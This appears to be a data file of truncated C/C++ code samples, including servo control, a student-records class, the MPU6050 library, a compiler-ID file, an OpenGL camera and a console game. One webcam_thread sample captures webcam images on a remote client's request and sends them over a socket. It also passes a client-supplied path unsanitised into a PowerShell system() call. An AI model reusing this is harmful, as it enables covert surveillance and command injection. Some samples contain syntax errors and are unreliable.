\u6b65\u6570\u8ba1\u7b97\r\n  delaytime = TOTAL_DELAY / steps; // \u6bcf\u6b65\u5ef6\u65f6\r\n\r\n  // \u8ba1\u7b97\u6bcf\u6b65\u8f6c\u52a8\u89d2\u5ea6\r\n  for (int i = 0; i < 3; i++) {\r\n    stepAngles[i] = (tA[i] - currentAngle[i]) / steps;\r\n  }\r\n\r\n  // \u5e73\u6ed1\u79fb\u52a8\u5230\u76ee\u6807\u89d2\u5ea6\r\n  for (int step = 0; step < steps; step++) {\r\n    // \u82e5\u6709\u65b0\u6570\u636e\u7acb\u5373\u4e2d\u65ad\u5f53\u524d\u5e73\u6ed1\u8fc7\u7a0b\r\n    if (asyncwebcam.newdata) break;\r\n    \r\n    // \u5426\u5219\u66f4\u65b0currentAngle\u5e76\u5199\u5165\u8235\u673a\r\n    for (int i = 0; i < 3; i++) {\r\n      currentAngle[i] += stepAngles[i];\r\n      servos[i] -> write(currentAngle[i]);\r\n    }\r\n    \r\n    // \u6bcf\u6b65\u7b49\u5f85\u7684\u65f6\u95f4\r\n    delay(delaytime);\r\n  }\r\n}\r\n\r\n\r\nSemaphoreHandle_t Mutex;\r\nbool is_mobile = false;\r\nbool newdata = false;\r\nint action;\r\nfloat joystickX, joystickY, joystickZ;\r\n\r\nTaskHandle_t servoTaskHandle; \r\nTaskHandle_t faceTracingTaskHandle; \r\n\r\nvoid faceTracingTask(void *pvParameters);\r\n\r\nvoid servo_task(void *pvParameters) {\r\n  Serial.println(\"Servo task on\");  \r\n  while (true) {\r\n    if (xSemaphoreTake(Mutex, portMAX_DELAY) == pdTRUE) {\r\n      if (asyncwebcam.newdata) {\r\n        Serial.println(\"newdata\");\r\n        \r\n        // \u63d0\u53d6\u6240\u6709\u53d8\u91cf\r\n        newdata = true;\r\n        action = asyncwebcam.action;\r\n        joystickX = asyncwebcam.joystickX;\r\n        joystickY = asyncwebcam.joystickY;\r\n        joystickZ = asyncwebcam.joystickZ;\r\n        is_mobile = asyncwebcam.is_mobile;\r\n        \r\n        asyncwebcam.newdata = false;\r\n      }\r\n    }\r\n    xSemaphoreGive(Mutex);\r\n    \r\n\r\n    if (newdata) {\r\n      newdata = false;\r\n      // \u6447\u6746\r\n      if (action == 0) {\r\n        Serial.println(\"joystick\");\r\n        \r\n        targetAngle[0] = servoLimits[0].def + joystickX * fabs(servoLimits[0].max - servoLimits[0].min);\r\n        targetAngle[1] = servoLimits[1].def + joystickY * fabs(servoLimits[1].max - servoLimits[1].def);\r\n        targetAngle[2] = joystickZ;\r\n        \r\n        if (is_mobile) {\r\n          servo_smooth(targetAngle[0], targetAngle[1]);\r\n        } else {\r\n          servo_smooth(targetAngle[0], targetAngle[1], targetAngle[2]);\r\n        }  \r\n      }\r\n\r\n      //\u4eba\u8138\u8ddf\u8e2a\r\n      else if (action == 1) {\r\n        Serial.println(\"Servo task off, creating face tracing task\"); \r\n        xTaskCreate(faceTracingTask, \"FaceTracingTask\", 32768, NULL, 1, &faceTracingTaskHandle);\r\n        vTaskDelete(NULL); \r\n        \r\n      }\r\n\r\n\r\n      // \u7728\u773c\r\n      else if (action == -1) {\r\n        Serial.println(\"activate action -1\");\r\n\r\n        double temp[2][2];\r\n     ",
    "\n\n#include <iostream>\n#include <iomanip>\n#include <fstream>\n#include <sstream>\n\nusing namespace std;\n\nclass PersonType\n{\n    public:\n    PersonType(){\n        Name=\"\";\n    }\n    void setName(string name){\n        Name=name;\n    }\n    string getName(){\n        return Name;\n    }\n    void print(){\n        cout<<Name<<\" \";\n    }\n    private:\n    string Name;\n};\n\nclass CourseType\n{\n    public:\n    CourseType(){\n        courseName=\"\";\n        courseCredits=0;\n        courseGrade='x';\n        courseNo=\"\";\n    }\n    CourseType(string name,string no, int credit,char grade);\n    void setCourseInfo(string name,string no, int credit,char grade){\n        courseName=name;\n        courseNo=no;\n        courseCredits=credit;\n        courseGrade=grade;\n    }\n\n    string getName(){\n        return courseName;\n    }\n    int getCredits(){\n        return courseCredits;\n    }\n    string getCourseNo(){\n        return courseNo;\n    }\n    char getCourseGrade(){\n        return courseGrade;\n    }\n\n    private:\n    string courseName;\n    string courseNo;\n    int courseCredits;\n    char courseGrade;\n};\n\nCourseType::CourseType(string name,string no, int credit,char grade) \n{\n    courseName=name;\n    courseNo=no;\n    courseCredits=credit;\n    courseGrade=grade;\n} \n\n\n\nclass StudentType\n{\n    public:\n    StudentType(int size);\n    ~StudentType();\n    void print();\n    void print(string a);\n    void readInput(string fileName);//inputu okuyup kaydeder\n    void getHoursEnrolled();///ogrenci toplam ka\u00e7 kredilik derse kay\u0131tl\u0131 onu hesapl\u0131yo totalHours'a yaz\u0131yor\n    void getGPA();//ortalama hesapl\u0131yo GPA'ye yaz\u0131yor\n    void billingAmmount();//har\u00e7 tutar\u0131 bill'e yaz\u0131yor\n\n    private:\n    string* Id;\n    char* isTuitonPaid;\n    int* numberOfCourses;//\u00f6\u011frencinin ka\u00e7 kurs ald\u0131\u011f\u0131n\u0131 tutuyor\n    string* CourseNames;//ald\u0131\u011f\u0131 t\u00fcm derlerin ismini tutuyor\n    string* CourseGrades;//course names s\u0131ras\u0131na g\u00f6re t\u00fcm notlar\u0131 tutuyor\n    double* GPA;//ortalama\n    int* totalHours;//toplam ka\u00e7 kredi hesapl\u0131yor.\n    int* bill;//har\u00e7 tutar\u0131\n    PersonType* person;//isim tutmak i\u00e7in --> composition\n    CourseType** course;//\u00f6\u011frencinin ald\u0131\u011f\u0131 kurslar\u0131 tutmak i\u00e7in  --> composition\n    int Ucret;//Toplam \u00f6denecek har\u00e7 \n    int Size;//ka\u00e7 \u00f6\u011frenci var\n};\n\nStudentType::StudentType(int size){\n    Id=new string[size];\n    isTuitonPaid=new char[size];\n    numberOfCourses=new int[size];\n    CourseNames = new string[size];\n    CourseGrades = new string[size];\n    GPA=new double[size];\n    totalHours=new int[size];\n    bill=new int[size];\n\n    person = new PersonType[size];\n    course= new CourseType*[size];\n\n    Size=size;\n\n    for (int i=0;i<size;i++){\n        person[i].setName(\"\");\n        Id[i]=\"\";\n        isTuitonPaid[i]='-';\n        numberOfCourses[i]=0;\n        CourseNames[i]=\"\";\n        CourseGrades[i]=\"\";\n        GPA[i]=0;\n        totalHours[i]=0;\n        bill[i]=0;\n    }\n}\n\nStudentType::~StudentType(){\n    delete[] Id;\n    delete[] isTuitonPaid;\n    delete[] numberOfCourses;\n    delete[] CourseNames;\n    delete[] CourseGrades;\n    delete[] totalHours;\n    delete[] GPA;\n    delete[] bill;\n    delete[] person;\n    for (int i = 0 i < Size; i++) {\n        delete[] course[i];\n    }\n    delete[] course;\n}\n\n\nvoid StudentType::readInput(string filename){\n    ifstream input(filename);\n    while(!input.is_open()){\n        cout<<\"Dosya a\u00e7\u0131lamad\u0131: \"<<filename<<endl;\n        return;\n    }\n\n    string text;\n    int ogrenciSayisi,ucret;\n    int index=0;\n    getline(input,text);\n    stringstream ss(text);\n    ss>>ogrenciSayisi;\n    ss>>ucret;\n    Ucret=ucret;//inputun ilk sat\u0131r\u0131ndeki \u00f6\u011frenci say\u0131s\u0131n\u0131 ve \u00fccreti okur\n    while(getline(input,text)){\n        int dersSayisi;\n        string surname,temp;\n                                                                       \n        stringstream line(text); //                                     Lisa Miller 890238 Y 4\n        getline(line,temp,' ');  //     Lisa\n        getline(line,surname,' '); //   Miller\n        temp=temp+\" \"+surname;  // temp = Lisa Miller\n        person[index].setName(temp);\n        getline(line,temp,' ');  // 890238\n        Id[index]=temp;  \n        getline(line,temp,' ');\n        isTuitonPaid[index]=temp[0];\n        getline(line,temp);\n        dersSayisi=stoi(temp);\n\n        numberOfCourses[index]=dersSayisi;\n\n\n        course[index]=new CourseType[dersSayisi];\n        \n        for (int i=0;i<dersSayisi;i++){\n            getline(input,text);\n            string cId,cHour,cGrade;\n            stringstream line(text);\n\n            getline(line,temp,' ');                                                                                     C\n            CourseNames[index]+=temp+\" \";\n            getline(line,cId,' ');\n            getline(line,cHour,' ');\n            getline(line,cGrade,' ');\n            CourseGrades[index]+=cGrade;\n            course[index][i].setCourseInfo(temp,cId,stoi(cHour),cGrade[0]);\n        }\n        index++;\n    }\n}\n\nvoid StudentType::getHoursEnrolled(){\n    for(int i=0;i<Size;i++){\n        for(int j=",
    "// I2Cdev library collection - MPU6050 I2C device class\n// Based on InvenSense MPU-6050 register map document rev. 2.0, 5/19/2011 (RM-MPU-6000A-00)\n// 8/24/2011 by Jeff Rowberg <jeff@rowberg.net>\n// Updates should (hopefully) always be available at https://github.com/jrowberg/i2cdevlib\n//\n// Changelog:\n//  2021-09-27 - split implementations out of header files, finally\n//  2019-07-08 - Added Auto Calibration routine\n//     ... - ongoing debug release\n\n// NOTE: THIS IS ONLY A PARIAL RELEASE. THIS DEVICE CLASS IS CURRENTLY UNDERGOING ACTIVE\n// DEVELOPMENT AND IS STILL MISSING SOME IMPORTANT FEATURES. PLEASE KEEP THIS IN MIND IF\n// YOU DECIDE TO USE THIS PARTICULAR CODE FOR ANYTHING.\n\n/* ============================================\nI2Cdev device library code is placed under the MIT license\nCopyright (c) 2012 Jeff Rowberg\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in\nall copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\nTHE SOFTWARE.\n===============================================\n*/\n\n#include \"MPU6050.h\"\n\n/** Specific address constructor.\n * @param address I2C address, uses default I2C address if none is specified\n * @see MPU6050_DEFAULT_ADDRESS\n * @see MPU6050_ADDRESS_AD0_LOW\n * @see MPU6050_ADDRESS_AD0_HIGH\n */\nMPU6050_Base::MPU6050_Base(uint8_t address, void *wireObj):devAddr(address), wireObj(wireObj) {\n}\n\n/** Power on and prepare for general usage.\n * This will activate the device and take it out of sleep mode (which must be done\n * after start-up). This function also sets both the accelerometer and the gyroscope\n * to their most sensitive settings, namely +/- 2g and +/- 250 degrees/sec, and sets\n * the clock source to use the X Gyro for reference, which is slightly better than\n * the default internal clock source.\n */\nvoid MPU6050_Base::initialize() {\n    setClockSource(MPU6050_CLOCK_PLL_XGYRO);\n    setFullScaleGyroRange(MPU6050_GYRO_FS_250);\n    setFullScaleAccelRange(MPU6050_ACCEL_FS_2);\n    setSleepEnabled(false); // thanks to Jack Elston for pointing this one out!\n}\n\n/** Verify the I2C connection.\n * Make sure the device is connected and responds as expected.\n * @return True if connection is valid, false otherwise\n */\nbool MPU6050_Base::testConnection() {\n    return getDeviceID() == 0x34;\n}\n\n// AUX_VDDIO register (InvenSense demo code calls this RA_*G_OFFS_TC)\n\n/** Get the auxiliary I2C supply voltage level.\n * When set to 1, the auxiliary I2C bus high logic level is VDD. When cleared to\n * 0, the auxiliary I2C bus high logic level is VLOGIC. This does not apply to\n * the MPU-6000, which does not have a VLOGIC pin.\n * @return I2C supply voltage level (0=VLOGIC, 1=VDD)\n */\nuint8_t MPU6050_Base::getAuxVDDIOLevel() {\n    I2Cdev::readBit(devAddr, MPU6050_RA_YG_OFFS_TC, MPU6050_TC_PWR_MODE_BIT, buffer, I2Cdev::readTimeout, wireObj);\n    return buffer[0];\n}\n/** Set the auxiliary I2C supply voltage level.\n * When set to 1, the auxiliary I2C bus high logic level is VDD. When cleared to\n * 0, the auxiliary I2C bus high logic level is VLOGIC. This does not apply to\n * the MPU-6000, which does not have a VLOGIC pin.\n * @param level I2C supply voltage level (0=VLOGIC, 1=VDD)\n */\nvoid MPU6050_Base::setAuxVDDIOLevel(uint8_t level) {\n    I2Cdev::writeBit(devAddr, MPU6050_RA_YG_OFFS_TC, MPU6050_TC_PWR_MODE_BIT, level, wireObj);\n}\n\n// SMPLRT_DIV register\n\n/** Get gyroscope output rate divider.\n * The sensor register output, FIFO output, DMP sampling, Motion detection, Zero\n * Motion detection, and Free Fall detection are all based on the Sample Rate.\n * The Sample Rate is generated by dividing the gyroscope output rate by\n * SMPLRT_DIV:\n *\n * Sample Rate = Gyroscope Output Rate / (1 + SMPLRT_DIV)\n *\n * where Gyroscope Output Rate = 8kHz when the DLPF is disabled (DLPF_CFG = 0 or\n * 7), and 1kHz when the DLPF is enabled (see Register 26).\n *\n * Note: The accelerometer output rate is 1kHz. This means that for a Sample\n * Rate greater than 1kHz, the same accelerometer sample may be output to the\n * FIFO, DMP, and sensor registers more than once.\n *\n * For a diagram of the gyroscope and accelerometer signal paths, see Section 8\n",
    "#include \"webcam_thread.h\"\n\n// Function to send a message to the client\nvoid WebcamThread::sendMessage(json message) {\n    string tam = message.dump();\n    int count = send(client_socket, tam.c_str(), BUFFER_SIZE, 0);\n}\n\n// Function to compress a folder as a zip file\nbool WebcamThread::zipFolder(string folder_path) {\n    string cmd = \"powershell Compress-Archive -Path \\\"\" + folder_path + \"\\\" \" + \"-DestinationPath \\\"\" + folder_path + \"\\\"\";\n    return system(cmd.c_str()) == 0;\n}\n\n// Function to create a reply message for the client\njson WebcamThread::creatReplyMessageByWebcam(int status) {\n    json reply;\n    reply[\"cmd\"] = \"webcam\";\n\n    ifstream input(folder_path + \".zip\", ios::binary | ios::ate);\n    if (!input.is_open()) {\n        cout << \"FILE CANT OPENT\" << endl;\n        return reply;\n    }\n    int file_size = input.tellg();\n    input.close();\n\n    reply[\"body\"][\"error_code\"] = to_string(status);\n    reply[\"body\"][\"path\"] = folder_path + \".zip\";\n    reply[\"body\"][\"bytes\"] = file_size;\n    reply[\"body\"][\"filename\"] = (string)requestFromClient[\"filename\"] + \".zip\";\n    log(reply.dump(4));\n    return reply;\n}\n\n// Function to create a folder for saving the webcam images/videos\nstring WebcamThread::creatFolderForSaving() {\n    string folderName = get_current_time() + \"_WEBCAM\";\n    string requestPath = requestFromClient.contains(\"save_path\") ? requestFromClient[\"save_path\"] : \"\";\n    string path = requestPath != \"\" ? requestPath + folderName : getProjectRootDirectory() + \"\\\\\" + folderName;\n\n    requestFromClient[\"save_path\"] = path;\n    requestFromClient[\"filename\"] = folderName;\n\n    if (_mkdir(path.c_str()) == 0) {\n        log(\"Folder: \" + path + \" created successfully\", SUCCESS_LOG);\n    }\n\telse log(\"Error: Failed to create folder: \" + path, ERROR_LOG);\n    return path;\n}\n\n// Function to capture a single photo from the webcam\nvoid WebcamThread::webcamCapture() {\n    int status = 0;\n    json message;\n\n    // Open the default camera\n    cv::VideoCapture cap(0);\n\n    // Retry mechanism\n    for (int retries = 0; retries < 5; ++retries) {\n        if (cap.isOpened()) break;\n        this_thread::sleep_for(chrono::milliseconds(200)); // Wait for 200 ms\n    }\n\n    if (!cap.isOpened()) {\n\t\tlog(\"Error: Could not open the camera after retries.\", ERROR_LOG);\n        return;\n    }\n\n    // Warm up the camera by capturing a few frames\n    for (int i = 0; i < 30; ++i) {\n        cv::Mat temp;\n        cap >> temp;\n    }\n\n    // Capture a single frame\n    cv::Mat frame;\n    cap >> frame;\n\n    // Check if the frame is valid\n    if (frame.empty()) {\n\t\tlog(\"Could not capture a frame from the camera.\", ERROR_LOG);\n        cap.release();\n        return;\n    }\n\n    // Save the frame as an image\n    string file_path = folder_path + \"\\\\\" + get_current_time() + \".png\";\n    if (!cv::imwrite(file_path, frame)) {\n\t\tlog(\"Could not save the image to the file path: \" + file_path, ERROR_LOG);\n    }\n    else {\n\t\tlog(\"Image saved to: \" + file_path, SUCCESS_LOG);\n    }\n\n    // Release the camera\n    cap.release();\n    cv::destroyAllWindows();\n\n    // Allow time for the camera to fully deactivate\n    this_thread::sleep_for(chrono::milliseconds(100));\n\n    if (zipFolder(folder_path)) {\n        status = 1;\n        message = creatReplyMessageByWebcam(status);\n    }\n    else {\n        status = -301;\n        message = creatReplyMessageByWebcam(status);\n    }\n    sendMessage(message);\n\n    string zip_filename = folder_path + \".zip\";\n    sendFile(zip_filename, client_socket);\n\n\tlog(\"Webcam image sent successfully\", SUCCESS_LOG);\n}\n\n// Function to create a new thread that captures multiple photos from the webcam\nvoid WebcamThread::webcamWorkerThread() {\n    // Send response to the client that the screenshot thread has started\n    json response = {\n        {\"cmd\", \"webcamitv\"},\n        {\"body\", {\n            {\"status\", \"started\"},\n        }}\n    };\n\n    string responseString = response.dump();\n    send(client_socket, responseString.c_str(), BUFFER_SIZE, 0);\n\n    // Start webcam capture process\n    cv::VideoCapture cap(0);\n    json message;\n\n    // Retry mechanism to check if the camera is opened\n    for (int retries = 0; retries < 5; ++retries) {\n        if (cap.isOpened()) break;\n        log(\"Retry #\" + to_string(retries + 1) + \": Unable to open camera.\", WARNING_LOG);\n        this_thread::sleep_for(chrono::milliseconds(200)); // Wait for 200 ms\n    }\n\n    if (!cap.isOpened()) {\n\t\tlog(\"Could not open the camera after retries.\", ERROR_LOG);\n        return;\n    }\n\n    // Start capturing images within the specified interval\n    while (webcam_running) {\n        this_thread::sleep_for(chrono::seconds(interval));\n        for (int i = 0; i < 1; i++) {\n            cv::Mat frame;\n            for (int i = 1; i < 30; i++) {\n                cv::Mat temp;\n                cap >> temp;\n            }\n            cap >> frame;\n            cv::imwrite(folder_path + \"\\\\\" + get_current_time() + \".png\", frame);\n        }\n\t\tlog(\"Webcam image saved successfully\", SUCCESS_LOG",
    "/* This source file must have a .cpp extension so that all C++ compilers\r\n   recognize the extension without flags.  Borland does not know .cxx for\r\n   example.  */\r\n#ifndef __cplusplus\r\n# error \"A C compiler has been selected for C++.\"\r\n#endif\r\n\r\n#if !defined(__has_include)\r\n/* If the compiler does not have __has_include, pretend the answer is\r\n   always no.  */\r\n#  define __has_include(x) 0\r\n#endif\r\n\r\n\r\n/* Version number components: V=Version, R=Revision, P=Patch\r\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\r\n\r\n#if defined(__INTEL_COMPILER) || defined(__ICC)\r\n# define COMPILER_ID \"Intel\"\r\n# if defined(_MSC_VER)\r\n#  define SIMULATE_ID \"MSVC\"\r\n# endif\r\n# if defined(__GNUC__)\r\n#  define SIMULATE_ID \"GNU\"\r\n# endif\r\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\r\n     except that a few beta releases use the old format with V=2021.  */\r\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\r\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\r\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\r\n#  if defined(__INTEL_COMPILER_UPDATE)\r\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\r\n#  else\r\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\r\n#  endif\r\n# else\r\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\r\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\r\n   /* The third version component from --version is an update index,\r\n      but no macro is provided for it.  */\r\n#  define COMPILER_VERSION_PATCH DEC(0)\r\n# endif\r\n# if defined(__INTEL_COMPILER_BUILD_DATE)\r\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\r\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\r\n# endif\r\n# if defined(_MSC_VER)\r\n   /* _MSC_VER = VVRR */\r\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\r\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\r\n# endif\r\n# if defined(__GNUC__)\r\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\r\n# elif defined(__GNUG__)\r\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\r\n# endif\r\n# if defined(__GNUC_MINOR__)\r\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\r\n# endif\r\n# if defined(__GNUC_PATCHLEVEL__)\r\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\r\n# endif\r\n\r\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\r\n# define COMPILER_ID \"IntelLLVM\"\r\n#if defined(_MSC_VER)\r\n# define SIMULATE_ID \"MSVC\"\r\n#endif\r\n#if defined(__GNUC__)\r\n# define SIMULATE_ID \"GNU\"\r\n#endif\r\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\r\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\r\n * VVVV is no smaller than the current year when a version is released.\r\n */\r\n#if __INTEL_LLVM_COMPILER < 1000000L\r\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\r\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\r\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\r\n#else\r\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\r\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\r\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\r\n#endif\r\n#if defined(_MSC_VER)\r\n  /* _MSC_VER = VVRR */\r\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\r\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\r\n#endif\r\n#if defined(__GNUC__)\r\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\r\n#elif defined(__GNUG__)\r\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\r\n#endif\r\n#if defined(__GNUC_MINOR__)\r\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\r\n#endif\r\n#if defined(__GNUC_PATCHLEVEL__)\r\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\r\n#endif\r\n\r\n#elif defined(__PATHCC__)\r\n# define COMPILER_ID \"PathScale\"\r\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\r\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\r\n# if defined(__PATHCC_PATCHLEVEL__)\r\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\r\n# endif\r\n\r\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\r\n# define COMPILER_ID \"Embarcadero\"\r\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\r\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\r\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\r\n\r\n#elif defined(__BORLANDC__)\r\n# define COMPILER_ID \"Borland\"\r\n  /* __BORLANDC__ = 0xVRR */\r\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\r\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\r\n\r\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\r\n# define COMPILER_ID \"Watcom\"\r\n   /* __WATCOMC__ = VVRR */\r\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\r\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\r\n# if (__WATCOMC__ % 10) > 0\r\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\r\n# endif\r\n\r\n#elif defined(__WATCOMC__)\r\n# define COMPILER_ID \"OpenWatcom\"\r\n   /* __WATCOMC__ = VVRP + 1100 */\r\n# define COMPILER_VERSION_MAJOR DEC((__WATCOMC__ - 1100) ",
    "#include \"Camera.h\"\n\n// Constructor with vectors\nCamera::Camera(glm::vec3 position, glm::vec3 up, float yaw, float pitch)\n    : Front(glm::vec3(0.0f, 0.0f, -1.0f)), MovementSpeed(SPEED), MouseSensitivity(SENSITIVITY), Zoom(ZOOM) {\n    Position = position;\n    WorldUp = up;\n    Yaw = yaw;\n    Pitch = pitch;\n    updateCameraVectors();\n}\n\n// Constructor with scalar values\nCamera::Camera(float posX, float posY, float posZ, float upX, float upY, float upZ, float yaw, float pitch)\n    : Front(glm::vec3(0.0f, 0.0f, -1.0f)), MovementSpeed(SPEED), MouseSensitivity(SENSITIVITY), Zoom(ZOOM) {\n    Position = glm::vec3(posX, posY, posZ);\n    WorldUp = glm::vec3(upX, upY, upZ);\n    Yaw = yaw;\n    Pitch = pitch;\n    updateCameraVectors();\n}\n\n// Returns the view matrix calculated using Euler Angles and the LookAt Matrix\nglm::mat4 Camera::GetViewMatrix() {\n    return glm::lookAt(Position, Position + Front, Up);\n}\n\n// Processes keyboard input\nvoid Camera::ProcessKeyboard(Camera_Movement direction, float deltaTime) {\n    float velocity = MovementSpeed * deltaTime;\n    if (direction == FORWARD)\n        Position += glm::normalize(glm::vec3(1.0f, 0.0f, 1.0f) * Front) * velocity;\n    if (direction == BACKWARD)\n        Position -= glm::normalize(glm::vec3(1.0f, 0.0f, 1.0f) * Front) * velocity * 0.7f;\n    if (direction == LEFT)\n        Position -= glm::normalize(glm::vec3(1.0f, 0.0f, 1.0f) * Right) * velocity * 0.7f;\n    if (direction == RIGHT)\n        Position += glm::normalize(glm::vec3(1.0f, 0.0f, 1.0f) * Right) * velocity * 0.7f;\n    if (direction == UP)\n        Position += glm::vec3(0.0f, 1.0f, 0.0f) * velocity * 0.7f;\n    if (direction == DOWN)\n        Position -= glm::vec3(0.0f, 1.0f, 0.0f) * velocity * 0.7f;\n}\n\n// Processes mouse movement input\nvoid Camera::ProcessMouseMovement(float xoffset, float yoffset, GLboolean constrainPitch) {\n    xoffset *= MouseSensitivity;\n    yoffset *= MouseSensitivity;\n\n    Yaw += xoffset;\n    Pitch += yoffset;\n\n    // Constrain pitch to avoid screen flipping\n    if (constrainPitch) {\n        if (Pitch > 89.0f)\n            Pitch = 89.0f;\n        if (Pitch < -89.0f)\n            Pitch = -89.0f;\n    }\n\n    updateCameraVectors();\n}\n\n// Processes mouse scroll input\nvoid Camera::ProcessMouseScroll(float yoffset) {\n    Zoom -= (float)yoffset;\n    if (Zoom < 1.0f)\n        Zoom = 1.0f;\n    if (Zoom > 45.0f)\n        Zoom = 45.0f;\n}\n\n// Updates camera vectors based on Euler angles\nvoid Camera::updateCameraVectors() {\n    // Calculate the new Front vector\n    glm::vec3 front;\n    front.x = cos(glm::radians(Yaw)) * cos(glm::radians(Pitch));\n    front.y = sin(glm::radians(Pitch));\n    front.z = sin(glm::radians(Yaw)) * cos(glm::radians(Pitch));\n    Front = glm::normalize(front);\n    // Recalculate the Right and Up vectors\n    Right = glm::normalize(glm::cross(Front, WorldUp));\n    Up = glm::normalize(glm::cross(Right, Front));\n}\n",
    "#include <iostream>\n#include <chrono>\n#include <time.h>\n#include <cstdlib>\n#include <unistd.h>\nusing namespace std;\nusing namespace std::chrono;\n#define row 20\n#define col 20\nstruct score{\n    int movements=0;\n    int countB=0;\n    long int time=0;\n};\nint main()\n{\n    int hardness();\n    void easyplayground(char ground[row][col],int x,int y);\n    void mediumplayground(char ground[row][col],int x,int y);\n    void hardplayground( char ground[row][col],int x,int y);\n    void help();\n    void easyB(char ground[row][col],int x,int y);\n    void mediumB(char ground[row][col],int x,int y);\n    void hardB(char ground[row][col],int x,int y);\n    void easygame();\n    void mediumgame();\n    void hardgame();\n    void menu();\n    void space();\n    \n    string s=\"Welcome to the Spoon Man game\";\n    for (int i=0; i<30; ++i) {\n        usleep(200000);\n        cout<<s[i];\n    }\n    usleep(2000000);\n    menu();\n    return 0;\n}\ndouble point( score m, score cb, score t,const int wm,const int wt,const int wb)\n{\n    double s;\n    s=1000/(1+(m.movements*wm)+(cb.countB*wb)+(t.time*wt));\n    return s;\n}\nvoid space()\n{\n    for (int i=0; i<21; ++i) {\n        cout<<endl;\n    }\n}\nvoid spacemenu()\n{\n    for(int j=0;j<42;++j)\n        cout<<endl;\n}\nint hardness()\n{\n    int ans;\n    string k=\"\\n\\n1.easy\\n2.medium\\n3.Hard\\n4.menu\\n\";\n    for (int i=0; i<33; ++i) {\n        usleep(100000);\n        cout<<k[i];\n    }\n    cin>>ans;\n    return ans;\n}\nvoid help()\n{\n    string i=\"\\n\\n\\n\\n\\nHi\\nIn this game if you want to survive,you just need to kill enemis with bombs and finally reach home.\\n you can move with D:\u2b95 ,W:\u2b06 ,S:\u2b07 ,A:\u2b05 and press B button whenever you needed to demolish something.\\n\\nS:you\\nE:your enemy\\nXX:unbreakable wall\\n= :breakable wall\\nB!:bomb\\n<>:home\\n\\n\\nGame maker:Raha Pazoki\\nId:4021226411\";\n    for (int k=0; k<328; ++k) {\n        usleep(100000);\n        cout<<i[k];\n    }\n    usleep(5000000);\n}\nvoid easyplayground (char ground[row][col],int x,int y)\n{\n    ground[x][y] = 'S';\n    int ran;\n    srand(time_t(0));\n    for (int i=1; i<row; i++) {\n        for (int j=1; j<col; j++) {\n            if 